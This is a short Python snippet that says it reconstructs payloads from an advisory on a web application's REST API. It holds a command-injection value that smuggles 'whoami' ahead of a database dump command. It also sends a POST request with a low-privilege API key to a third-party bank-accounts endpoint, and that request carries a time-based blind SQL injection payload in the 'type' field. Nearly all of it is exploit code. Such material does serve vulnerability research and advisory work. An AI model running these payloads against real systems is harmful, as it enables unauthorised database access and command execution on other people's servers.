import requests

# Reconstructed payloads from the advisory; this is not the author's script.
SYSTEMTOOLS_MYSQLDUMP = "whoami&&/opt/db/bin/mariadb-dump"
result = requests.post(
    "http://192.0.2.44:8080/api/index.php/thirdparties/82/bankaccounts",
    headers={"DOLAPIKEY": "lowprivkey1234567890abcdef12345678"},
    json={"type": "ban', (SELECT IF(SUBSTRING(DATABASE(),1,1)='a',sLeEp (2.5),0)), 'report')#"},
)
